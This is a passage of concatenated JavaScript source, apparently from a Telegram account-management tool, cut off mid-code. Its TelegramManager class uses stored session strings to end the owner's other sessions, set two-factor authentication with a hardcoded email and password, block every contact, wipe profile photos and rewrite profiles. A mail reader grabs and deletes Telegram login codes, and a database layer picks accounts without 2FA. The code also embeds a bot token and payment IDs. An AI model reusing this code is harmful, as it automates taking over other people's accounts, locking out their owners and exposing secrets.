} catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async getUsersFullData(limit = 2, skip = 0) {\r\n        const result = await this.users?.find({}).skip(skip).limit(limit).sort({ _id: 1 }).toArray();\r\n        if (result) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async insertInBufferClients(user) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const bufferColl = this.client.db(\"tgclients\").collection('bufferClients');\r\n            await bufferColl.updateOne(filter, { $set: { ...user } }, { upsert: true });\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async readBufferClients(filter, limit) {\r\n        const bufferColl = this.client.db(\"tgclients\").collection('bufferClients');\r\n        const query = filter || {};\r\n        const queryWithLimit = limit ? bufferColl.find(query).limit(limit) : bufferColl.find(query);\r\n        const result = await queryWithLimit.toArray();\r\n        if (result?.length > 0) {\r\n            return result;\r\n        } else {\r\n            return [];\r\n        }\r\n    }\r\n\r\n\r\n    async getOneBufferClient() {\r\n        const bufferColl = this.client.db(\"tgclients\").collection('bufferClients');\r\n        const result = await bufferColl.findOne({});\r\n        if (result) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async deleteBufferClient(user) {\r\n        const filter = { mobile: user.mobile };\r\n        const bufferColl = this.client.db(\"tgclients\").collection('bufferClients');\r\n        try {\r\n            const entry = await bufferColl.deleteOne(filter);\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async getNewBufferClients(ids) {\r\n        const cursor = this.users.find({ \"mobile\": { $nin: ids }, twoFA: { $exists: false } }).sort({ lastActive: 1 }).limit(20);\r\n        return cursor\r\n    }\r\n\r\n    async readPromoteStats() {\r\n        const promotColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n        const result = await promotColl.find({}, { projection: { \"client\": 1, \"totalCount\": 1, \"lastUpdatedTimeStamp\": 1, \"isActive\": 1, \"_id\": 0 } }).sort({ totalCount: -1 }).toArray();\r\n        if (result.length > 0) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async readSinglePromoteStats(clientId) {\r\n        const promotColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n        const result = await promotColl.findOne({ client: clientId }, { projection: { \"client\": 1, \"totalCount\": 1, \"lastUpdatedTimeStamp\": 1, \"isActive\": 1, \"_id\": 0 } });\r\n        return result\r\n    }\r\n\r\n    async readStats() {\r\n        const result = await this.statsDb.find({}).sort({ newUser: -1 })\r\n        if (result) {\r\n            return result.toArray();\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async read(chatId) {\r\n        const result = await this.db.findOne({ chatId });\r\n        if (result) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n    async removeOnefromChannel(filter) {\r\n        try {\r\n            await this.db.deleteOne(filter)\r\n        } catch (e) {\r\n            console.log(e)\r\n        }\r\n    }\r\n\r\n    async getUsers(limit, skip = 0) {\r\n        const result = await this.users?.find({}, { projection: { firstName: 1, userName: 1, mobile: 1, _id: 0 } }).skip(skip).limit(limit).toArray();\r\n        if (result) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async getupi(key) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('upi-ids');\r\n        const upiIds = await upiDb.findOne({});\r\n        return upiIds[key] || \"lakshmi-69@paytm\"\r\n    }\r\n\r\n    async getAllUpis() {\r\n        const upiDb = this.client.db(\"tgclients\").collection('upi-ids');\r\n        const upiIds = await upiDb.findOne({});\r\n        return upiIds\r\n    }\r\n\r\n    async updateUpis(data) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('upi-ids');\r\n        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });\r\n        return upiIds\r\n    }\r\n\r\n    async getBuilds() {\r\n        const buildBd = this.client.db(\"tgclients\").collection('builds');\r\n        const builds = await buildBd.findOne({});\r\n        return builds\r\n    }\r\n\r\n    async updateBuilds(data) {\r\n        const buildBd = this.client.db(\"tgclients\").collection('builds');\r\n        const builds = await buildBd.updateOne({}, { $set: { ...data } }, { upsert: true });\r\n        return builds\r\n    }\r\n\r\n    async getUserConfig(filter) {\r\n        const clientDb = this.client.db(\"tgclients\").collection('clients');\r\n        const client = await clientDb.findOne(filter);\r\n        return client\r\n    }\r\n    async updateUserConfig(filter, data) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('clients');\r\n        const updatedDocument = await upiDb.findOneAndUpdate(filter, { $set: { ...data } }, { returnOriginal: false });\r\n        return updatedDocument.value;\r\n    }\r\n\r\n    async insertInAchivedClient(data) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('ArchivedClients');\r\n        const upiIds = await upiDb.updateOne({ number: data.number }, { $set: { ...data } }, { upsert: true });\r\n        return upiIds\r\n    }\r\n\r\n    async getInAchivedClient(filter) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('ArchivedClients');\r\n        const upiIds = await upiDb.findOne(filter)\r\n        return upiIds\r\n    }\r\n\r\n    async getAllUserClients() {\r\n        const clientDb = this.client.db(\"tgclients\").collection('clients');\r\n        const clients = await clientDb.aggregate([\r\n            {\r\n                $project: {\r\n                    \"_id\": 0,\r\n                    \"session\": 0,\r\n                    \"number\": 0,\r\n                    \"password\": 0,\r\n                }\r\n            }\r\n        ]).toArray();\r\n        return clients;\r\n    }\r\n\r\n    async getTgConfig() {\r\n        const clientDb = this.client.db(\"tgclients\").collection('configuration');\r\n        const client = await clientDb.findOne({ \"apiId\": \"1591339\" });\r\n        return client\r\n    }\r\n\r\n    async updateTgConfig(data) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('configurations');\r\n        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });\r\n        return upiIds\r\n    }\r\n\r\n    async processUsers(limit = undefined, skip = undefined) {\r\n        const cursor = this.users.find({ \"lastUpdated\": { \"$exists\": false } }).limit(limit ? limit : 300).skip(skip ? skip : 0);\r\n        return cursor;\r\n    }\r\n\r\n    async clearStats() {\r\n        const result = await this.statsDb.deleteMany({ \"payAmount\": { $lt: 5 } });\r\n        console.log(result);\r\n    }\r\n\r\n    async clearStats2() {\r\n        const result = await this.statsDb2?.deleteMany({});\r\n        console.log(result);\r\n    }\r\n\r\n    async clearPromotionStats() {\r\n        const promotColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n        const result = await promotColl.deleteMany({});\r\n        console.log(result);\r\n    }\r\n\r\n    async closeConnection() {\r\n        try {\r\n            if (this.isConnected) {\r\n                this.isConnected = false;\r\n                console.log('MongoDB connection closed.');\r\n            }\r\n            await this.client?.close();\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async getCurrentActiveUniqueChannels() {\r\n        const promoteStatsColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n\r\n        const cursor = promoteStatsColl.find({});\r\n        const uniqueChannels = new Set();\r\n\r\n        await cursor.forEach((document) => {\r\n            for (const channel in document.data) {\r\n                uniqueChannels.add(channel);\r\n            }\r\n        });\r\n\r\n        const uniqueChannelNames = Array.from(uniqueChannels);\r\n        return uniqueChannelNames;\r\n    }\r\n\r\n\r\n    async initPromoteStats() {\r\n        const promotColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n        const users = await this.getAllUserClients();\r\n        for (const user of users) {\r\n            const obj = {\r\n                client: user.clientId,\r\n                data: {},\r\n                totalCount: 0,\r\n                uniqueChannels: 0,\r\n                lastupdatedTimeStamp: Date.now()\r\n            }\r\n\r\n            const existingDocument = await promotColl.findOne({ client: user.clientId });\r\n            if (!existingDocument) {\r\n                await promotColl.insertOne(obj);\r\n            }\r\n        }\r\n    }\r\n\r\n    async getActiveChannels(limit = 50, skip = 0, keywords = [], notIds = [], collection = 'activeChannels') {\r\n        const pattern = new RegExp(keywords.join('|'), 'i');\r\n        const notPattern = new RegExp('online|board|class|PROFIT|@wholesale|retail|topper|exam|medico|traini|cms|cma|subject|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\r\n        let query = {\r\n            $and: [\r\n                { username: { $ne: null } },\r\n                {\r\n                    $or: [\r\n                        { title: { $regex: pattern } },\r\n                        { username: { $regex: pattern } }\r\n                    ]\r\n                },\r\n                {\r\n                    channelId: { $nin: notIds }\r\n                },\r\n                {\r\n                    title: { $not: { $regex: notPattern } }\r\n                },\r\n                {\r\n                    username: { $not: { $regex: notPattern } }\r\n                }\r\n            ]\r\n        };\r\n\r\n        const sort = { participantsCount: -1 };\r\n        const promoteStatsColl = this.client.db(\"tgclients\").collection(collection);\r\n        try {\r\n            const result = await promoteStatsColl\r\n                .find(query)\r\n                .sort(sort)\r\n                .skip(skip)\r\n                .limit(limit)\r\n                .toArray();\r\n\r\n            return result;\r\n        } catch (error) {\r\n            console.error('Error:', error);\r\n            return [];\r\n        }\r\n    }\r\n\r\n    async updateActiveChannels() {\r\n        try {\r\n            const promoteStatsColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n            const activeChannelCollection = this.client.db(\"tgclients\").collection('activeChannels');\r\n\r\n            const cursor = promoteStatsColl.find({});\r\n            const uniqueChannels = new Set();\r\n\r\n            await cursor.forEach((document) => {\r\n                for (const channel in document.data) {\r\n                    if (channel) {\r\n                        uniqueChannels.add(channel);\r\n                    }\r\n                }\r\n            });\r\n\r\n            const uniqueChannelNames = Array.from(uniqueChannels);\r\n            const channelInfoCollection = this.client.db(\"tgclients\").collection('channels');\r\n\r\n            for (const channelName of uniqueChannelNames) {\r\n                const existingChannel = await activeChannelCollection.findOne({ username: `@${channelName}` }, { projection: { \"_id\": 0 } });\r\n                if (!existingChannel) {\r\n                    const channelInfo = await channelInfoCollection.findOne({ username: `@${channelName}` }, { projection: { \"_id\": 0 } });\r\n                    if (channelInfo) {\r\n                        await activeChannelCollection.insertOne(channelInfo);\r\n                    }\r\n                }\r\n            }\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async removeOnefromActiveChannel(filter) {\r\n        try {\r\n            const activeChannelCollection = this.client.db(\"tgclients\").collection('activeChannels');\r\n            await activeChannelCollection.deleteOne(filter)\r\n        } catch (e) {\r\n            console.log(e)\r\n        }\r\n    }\r\n}\r\n\r\nmodule.exports = ChannelService;","const Imap = require('imap');\r\nconsole.log(\"Started Mail Reader\")\r\nlet isReady = false;\r\n\r\nfunction isMailReady() {\r\n    return isReady;\r\n}\r\n\r\nconst imap = new Imap({\r\n    user: process.env.GMAIL_ADD,\r\n    password: process.env.GMAIL_PASS,\r\n    host: 'imap.gmail.com',\r\n    port: 993,\r\n    tls: true,\r\n    tlsOptions: {\r\n        rejectUnauthorized: false\r\n    }\r\n\r\n});\r\n\r\nasync function openInbox(cb) {\r\n    imap.openBox('INBOX', false, cb);\r\n}\r\n\r\nimap.once('ready', function () {\r\n    console.log(\"ready\")\r\n    isReady = true;\r\n    return true\r\n});\r\n\r\nimap.once('error', (err) => {\r\n    console.error(\"SomeError :\", err);\r\n});\r\n\r\nimap.once('end', () => {\r\n    console.log('Connection ended');\r\n});\r\nlet result = ''\r\nasync function getcode() {\r\n    await openInbox(() => {\r\n        const searchCriteria = [['FROM', 'noreply@telegram.org']];\r\n        const fetchOptions = {\r\n            bodies: ['HEADER', 'TEXT'],\r\n            markSeen: true,\r\n        };\r\n        imap.search(searchCriteria, (err, results) => {\r\n            if (err) throw err;\r\n            console.log(results)\r\n            if (results.length > 0) {\r\n                const fetch = imap.fetch([results[results.length - 1]], fetchOptions);\r\n                fetch.on('message', (msg, seqno) => {\r\n                    const emailData = [];\r\n\r\n                    msg.on('body', (stream, info) => {\r\n                        let buffer = '';\r\n\r\n                        stream.on('data', (chunk) => {\r\n                            buffer += chunk.toString('utf8');\r\n                        });\r\n\r\n                        stream.on('end', () => {\r\n                            if (info.which === 'TEXT') {\r\n                                emailData.push(buffer);\r\n                            }\r\n                            imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\r\n                                if (err) throw err;\r\n                                imap.expunge((err) => {\r\n                                    if (err) throw err;\r\n                                    console.log(`Deleted message`);\r\n                                });\r\n                            });\r\n                        });\r\n                    });\r\n\r\n                    msg.once('end', () => {\r\n                        console.log(`Email #${seqno}, Latest${results[results.length - 1]}`);\r\n                        console.log(\"EmailDataLength: \", emailData.length);\r\n                        console.log(\"Mail:\", emailData[emailData.length - 1].split('.'));\r\n                        result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0])\r\n                    });\r\n                });\r\n                fetch.once('end', () => {\r\n                    console.log(\"fetched mails\")\r\n                });\r\n            }\r\n        });\r\n    });\r\n    console.log(\"Returning from mail Reader:\", result);\r\n    if (result.length > 4) {\r\n        imap.end();\r\n    }\r\n    return result\r\n}\r\n\r\nfunction fetchNumbersFromString(inputString) {\r\n    const regex = /\\d+/g;\r\n    const matches = inputString.match(regex);\r\n    if (matches) {\r\n        const result = matches.join('');\r\n        return result;\r\n    } else {\r\n        return '';\r\n    }\r\n}\r\nfunction connectToMail() {\r\n    result = '';\r\n    imap.connect();\r\n}\r\nfunction disconnectfromMail() {\r\n    result = '';\r\n    imap.end();\r\n}\r\nmodule.exports = { getcode, isMailReady, connectToMail, disconnectfromMail }\r\n","const swaggerJsdoc = require('swagger-jsdoc');\r\n\r\nconst options = {\r\n  definition: {\r\n    openapi: '3.0.0',\r\n    info: {\r\n      title: 'ReddyGirl',\r\n      version: '1.0.0',\r\n      description: 'API documentation for your Express application',\r\n    },\r\n  },\r\n  apis: ['./index.js'], \r\n};\r\n\r\nconst swaggerSpec = swaggerJsdoc(options);\r\n\r\nmodule.exports = swaggerSpec;\r\n","const { TelegramClient, Api } = require('telegram');\r\nconst { NewMessage } = require(\"telegram/events/index.js\");\r\nconst axios = require('axios');\r\nconst { StringSession } = require('telegram/sessions');\r\nconst { isMailReady, getcode, connectToMail, disconnectfromMail } = require('./mailreader')\r\nconst ppplbot = \"https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage\";\r\nconst { CustomFile } = require(\"telegram/client/uploads\");\r\nconst { sleep } = require('./utils')\r\nconst fs = require('fs');\r\nconst ChannelService = require('./dbservice');\r\n\r\nconst clients = new Map();\r\n\r\nlet activeClientSetup = undefined\r\nfunction getActiveClientSetup() {\r\n    return activeClientSetup;\r\n}\r\n\r\nfunction setActiveClientSetup(data) {\r\n    activeClientSetup = data\r\n}\r\n\r\nfunction getClient(number) {\r\n    return clients.get(number);\r\n}\r\n\r\nfunction hasClient(number) {\r\n    return clients.has(number);\r\n}\r\n\r\nasync function deleteClient(number) {\r\n    const cli = getClient(number);\r\n    await cli?.disconnect();\r\n    return clients.delete(number);\r\n}\r\n\r\nasync function disconnectAll() {\r\n    const data = clients.entries();\r\n    console.log(\"Disconnecting All Clients\");\r\n    for (const [phoneNumber, client] of data) {\r\n        try {\r\n            await client?.disconnect();\r\n            clients.delete(phoneNumber);\r\n            console.log(`Client disconnected: ${phoneNumber}`);\r\n        } catch (error) {\r\n            console.log(error);\r\n            console.log(`Failed to Disconnect : ${phoneNumber}`);\r\n        }\r\n    }\r\n}\r\n\r\n\r\nasync function createClient(number, session, autoDisconnect = true) {\r\n    if (!clients.has(number)) {\r\n        return new Promise(async (resolve) => {\r\n            const cli = new TelegramManager(session, number);\r\n            await cli.createClient(autoDisconnect);\r\n            if (cli.expired) {\r\n                clients.set(number, cli);\r\n            }\r\n            resolve(cli.expired);\r\n        });\r\n    } else {\r\n        return { msgs: 10, total: 10 }\r\n    }\r\n}\r\n\r\n\r\nclass TelegramManager {\r\n    constructor(sessionString, phoneNumber) {\r\n        this.session = new StringSession(sessionString);\r\n        this.phoneNumber = phoneNumber;\r\n        this.client = null;\r\n        this.expired = false;\r\n        this.channelArray = []\r\n    }\r\n\r\n    async disconnect() {\r\n        await this.client.disconnect();\r\n        await this.client.destroy();\r\n        this.session.delete();\r\n    }\r\n\r\n    async createClient(autoDisconnect = true) {\r\n        try {\r\n            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {\r\n                connectionRetries: 5,\r\n            });\r\n            console.log(\"Stating Client - \", this.phoneNumber)\r\n            await this.client.connect();\r\n            // const msg = await this.client.sendMessage(\"777000\", { message: \".\" });\r\n            // await msg.delete({ revoke: true });\r\n            const myMsgs = await this.client.getMessages('me', { limit: 8 });\r\n            if (autoDisconnect) {\r\n                setTimeout(async () => {\r\n                    if (this.client.connected || clients.get(this.phoneNumber)) {\r\n                        console.log(\"SELF destroy client\");\r\n                        await this.client.disconnect();\r\n                        await this.client.destroy();\r\n                        this.session.delete();\r\n                    } else {\r\n                        console.log(\"Client Already Disconnected\");\r\n                    }\r\n                    clients.delete(this.phoneNumber);\r\n                }, 180000)\r\n            } else {\r\n                setInterval(async () => {\r\n                    await this.client.connect();\r\n                }, 20000);\r\n            }\r\n            this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());\r\n            const chats = await this.client?.getDialogs({ limit: 500 });\r\n            console.log(\"TotalChats:\", chats['total'])\r\n            this.expired = { msgs: myMsgs['total'], total: chats['total'] }\r\n        } catch (error) {\r\n            console.log(error);\r\n            this.expired = undefined;\r\n        }\r\n    }\r\n\r\n    async getLastMsgs(limit) {\r\n        const msgs = await this.client.getMessages(\"777000\", { limit: parseInt(limit) });\r\n        let resp = ''\r\n        msgs.forEach((msg) => {\r\n            console.log(msg.text);\r\n            resp = resp + msg.text + \"\\n\"\r\n        })\r\n        return (resp)\r\n    }\r\n    async channelInfo(sendIds = false) {\r\n        const chats = await this.client?.getDialogs({ limit: 600 });\r\n        let canSendTrueCount = 0;\r\n        let canSendFalseCount = 0;\r\n        let totalCount = 0\r\n        this.channelArray.length = 0;\r\n        console.log(chats[\"total\"]);\r\n        chats.map(async (chat) => {\r\n            if (chat.isChannel || chat.isGroup) {\r\n                try {\r\n                    const chatEntity = await chat.entity.toJSON();\r\n                    const { broadcast, defaultBannedRights } = chatEntity;\r\n                    totalCount++;\r\n                    if (!broadcast && !defaultBannedRights?.sendMessages) {\r\n                        canSendTrueCount++;\r\n                        this.channelArray.push(chatEntity.id.toString());\r\n                    } else {\r\n                        canSendFalseCount++;\r\n                    }\r\n                } catch (error) {\r\n                    console.log(error)\r\n                }\r\n            }\r\n        });\r\n        const responseObj = {\r\n            chatsArrayLength: totalCount,\r\n            canSendTrueCount,\r\n            canSendFalseCount,\r\n            ids: sendIds ? this.channelArray : []\r\n        };\r\n        return responseObj\r\n    }\r\n\r\n    async joinChannels(str) {\r\n        const db = ChannelService.getInstance();\r\n        const channels = str.split('|');\r\n        console.log(this.phoneNumber, \" - channelsLen - \", channels.length)\r\n        for (let i = 0; i < channels.length; i++) {\r\n            const channel = channels[i].trim();\r\n            console.log(this.phoneNumber, \"Trying: \", channel)\r\n            try {\r\n                let joinResult = await this.client.invoke(\r\n                    new Api.channels.JoinChannel({\r\n                        channel: await this.client.getEntity(channel)\r\n                    })\r\n                );\r\n                console.log(this.phoneNumber, \" - Joined channel Sucesss - \", channel)\r\n                try {\r\n                    const chatEntity = await this.client.getEntity(channel)\r\n                    const { title, id, broadcast, defaultBannedRights, participantsCount, restricted, username } = chatEntity;\r\n                    const entity = {\r\n                        id: id.toString(),\r\n                        title,\r\n                        participantsCount,\r\n                        username,\r\n                        restricted,\r\n                        broadcast,\r\n                        sendMessages: defaultBannedRights?.sendMessages,\r\n                        canSendMsgs: false,\r\n                    };\r\n                    if (!chatEntity.broadcast && !defaultBannedRights?.sendMessages) {\r\n                        entity.canSendMsgs = true;\r\n                        try {\r\n                            await db.updateActiveChannels(entity.id.toString(), entity);\r\n                            console.log(\"updated ActiveChannels\");\r\n                        } catch (error) {\r\n                            console.log(error);\r\n                            console.log(\"Failed to update ActiveChannels\");\r\n                        }\r\n                    } else {\r\n                        await db.removeOnefromActiveChannel({ username: channel.replace(\"@\", '') });\r\n                        await db.removeOnefromChannel({ username: channel.startsWith(\"@\") ? channel : `@${channel}` });\r\n                        console.log(\"Removed Cahnnel- \", channel)\r\n                    }\r\n                } catch (error) {\r\n                    console.log(this.phoneNumber, \" - Failed - \", error)\r\n                }\r\n            } catch (error) {\r\n                console.log(\"Channels ERR: \", error);\r\n                if (error.toString().includes(\"No user has\") || error.toString().includes(\"USERNAME_INVALID\")) {\r\n                    await db.removeOnefromActiveChannel({ username: channel.replace(\"@\", '') });\r\n                    await db.removeOnefromChannel({ username: channel });\r\n                    console.log(\"Removed Cahnnel- \", channel)\r\n                }\r\n            }\r\n            console.log(this.phoneNumber, \" - On waiting period\")\r\n            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));\r\n            console.log(this.phoneNumber, \" - Will Try next\")\r\n        }\r\n        console.log(this.phoneNumber, \" - finished joining channels\")\r\n        await this.client.disconnect();\r\n        await deleteClient(this.phoneNumber);\r\n    }\r\n    async removeOtherAuths() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));\r\n        const updatedAuthorizations = result.authorizations.map((auth) => {\r\n            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||\r\n                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||\r\n                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||\r\n                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')\r\n                || auth.deviceModel.toLowerCase().includes('windows')) {\r\n                return auth;\r\n            } else {\r\n                this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));\r\n                return null;\r\n            }\r\n        }).filter(Boolean);\r\n        console.log(updatedAuthorizations);\r\n    }\r\n\r\n    async getAuths() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));\r\n        return result\r\n    }\r\n\r\n    async hasPassword() {\r\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\r\n        return passwordInfo.hasPassword\r\n    }\r\n\r\n    async blockAllUsers() {\r\n        const chats = await this.client?.getDialogs({ limit: 600 });\r\n        for (let chat of chats) {\r\n            if (chat.isUser) {\r\n                await this.blockAUser(chat.id)\r\n            }\r\n            sleep(5000);\r\n        }\r\n    }\r\n\r\n    async blockAUser(id) {\r\n        const result = await this.client.invoke(\r\n            new Api.contacts.Block({\r\n                id: id,\r\n            })\r\n        );\r\n    }\r\n\r\n    async getLastActiveTime() {\r\n        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));\r\n        let latest = 0\r\n        result.authorizations.map((auth) => {\r\n            if (!auth.country.toLowerCase().includes('singapore')) {\r\n                if (latest < auth.dateActive) {\r\n                    latest = auth.dateActive;\r\n                }\r\n            }\r\n        })\r\n        return latest\r\n    }\r\n\r\n    async getMe() {\r\n        const me = await this.client.getMe();\r\n        return me\r\n    }\r\n\r\n    async deleteProfilePhotos() {\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.photos.GetUserPhotos({\r\n                    userId: \"me\"\r\n                })\r\n            );\r\n            console.log(result)\r\n            if (result && result.photos?.length > 0) {\r\n                const res = await this.client.invoke(\r\n                    new Api.photos.DeletePhotos({\r\n                        id: result.photos\r\n                    }))\r\n            }\r\n            console.log(\"Deleted profile Photos\");\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async set2fa() {\r\n        connectToMail()\r\n        const intervalParentId = setInterval(async () => {\r\n            const isReady = isMailReady();\r\n            if (isReady) {\r\n                clearInterval(intervalParentId);\r\n                await this.client.updateTwoFaSettings({\r\n                    isCheckPassword: false,\r\n                    email: \"storeslaksmi@gmail.com\",\r\n                    hint: \"password - India143\",\r\n                    newPassword: \"Ajtdmwajt1@\",\r\n                    emailCodeCallback: async (length) => {\r\n                        console.log(\"code sent\");\r\n                        return new Promise(async (resolve) => {\r\n                            let retry = 0\r\n                            const intervalId = setInterval(async () => {\r\n                                console.log(\"checking code\");\r\n                                retry++\r\n                                const isReady = isMailReady();\r\n                                if (isReady && retry < 4) {\r\n                                    const code = await getcode();\r\n                                    if (code !== '') {\r\n                                        clearInterval(intervalId);\r\n                                        disconnectfromMail()\r\n                                        resolve(code);\r\n                                    }\r\n                                } else {\r\n                                    clearInterval(intervalId);\r\n                                    await this.client.disconnect();\r\n                                    await deleteClient(this.phoneNumber);\r\n                                    disconnectfromMail()\r\n                                    resolve(code);\r\n                                }\r\n                            }, 6000);\r\n                        });\r\n                    },\r\n                    onEmailCodeError: (e) => { console.log(e); return Promise.resolve(\"error\") }\r\n                })\r\n            }\r\n        }, 5000);\r\n    }\r\n\r\n    async updatePrivacyforDeletedAccount() {\r\n        try {\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneCall({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Calls Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyProfilePhoto({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"PP Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneNumber({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Number Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyStatusTimestamp({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyAbout({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"LAstSeen Updated\")\r\n        }\r\n        catch (e) {\r\n            console.log(e)\r\n        }\r\n    }\r\n    async updateProfile(firstName, about) {\r\n        try {\r\n            const result = await this.client.invoke(\r\n                new Api.account.UpdateProfile({\r\n                    firstName: firstName,\r\n                    lastName: \"\",\r\n                    about: about,\r\n                })\r\n            );\r\n            console.log(\"Updated NAme: \", firstName);\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n    async updateUsername(baseUsername) {\r\n        let newUserName = ''\r\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\r\n        let increment = 0;\r\n        if (username === '') {\r\n            try {\r\n                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                console.log(`Removed Username successfully.`);\r\n            } catch (error) {\r\n                console.log(error)\r\n            }\r\n        } else {\r\n            while (true) {\r\n                try {\r\n                    const result = await this.client.invoke(\r\n                        new Api.account.CheckUsername({ username })\r\n                    );\r\n                    console.log(result, \" - \", username)\r\n                    if (result) {\r\n                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));\r\n                        console.log(`Username '${username}' updated successfully.`);\r\n                        newUserName = username\r\n                        break;\r\n                    } else {\r\n                        username = baseUsername + increment;\r\n                        increment++;\r\n                        await sleep(4000);\r\n                    }\r\n                } catch (error) {\r\n                    console.log(error.message)\r\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\r\n                        newUserName = username;\r\n                        break;\r\n                    }\r\n                    username = baseUsername + increment;\r\n                    increment++;\r\n                }\r\n            }\r\n        }\r\n        return newUserName;\r\n    }\r\n\r\n    async updateProfilePic(image) {\r\n        try {\r\n            const file = await this.client.uploadFile({\r\n                file: new CustomFile(\r\n                    'pic.jpg',\r\n                    fs.statSync(\r\n                        image\r\n                    ).size,\r\n                    image\r\n                ),\r\n                workers: 1,\r\n            });\r\n            console.log(\"file uploaded- \", file)\r\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\r\n                file: file,\r\n            }));\r\n            console.log(\"profile pic updated\")\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async updatePrivacy() {\r\n        try {\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneCall({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Calls Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyProfilePhoto({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"PP Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyPhoneNumber({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueDisallowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"Number Updated\")\r\n\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyStatusTimestamp({}),\r\n                    rules: [\r\n                        new Api.InputPrivacyValueAllowAll()\r\n                    ],\r\n                })\r\n            );\r\n            console.log(\"LAstSeen Updated\")\r\n            await this.client.invoke(\r\n                new Api.account.SetPrivacy({\r\n                    key: new Api.InputPrivacyKeyAbout({}),\r\n                    rules: [\r\n                        new 